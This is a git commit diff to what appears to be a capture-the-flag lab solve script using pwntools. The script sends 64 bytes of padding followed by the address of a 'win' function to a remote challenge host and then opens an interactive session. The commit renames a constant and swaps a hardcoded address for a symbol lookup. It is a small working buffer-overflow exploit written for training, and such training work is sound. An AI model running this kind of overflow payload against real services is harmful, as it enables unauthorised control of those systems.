2be101d363e0bedb23b6f2a6673186e8bbfb4947
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 21:37:05 +0200

    Comments

--- lab1_2recap/02_canary_callback/solve.py
+++ lab1_2recap/02_canary_callback/solve.py
@@ -3,12 +3,14 @@ from pwn import *
 
 elf = context.binary = ELF('./canary_callback', checksec=False)
 
-OFFSET_TO_CANARY = 64
+OFFSET_TO_CAST = 64
 p = remote("offsec.m0lecon.it", 13518)
 p.recvuntil(b"incantation:\n")
+
+# padding until cast, then win address
 payload = flat(
-b"A" * OFFSET_TO_CANARY,
-p64(0x00000000004012a3)
+b"A" * OFFSET_TO_CAST,
+p64(elf.sym.win)
 )
 p.send(payload)
 p.interactive()
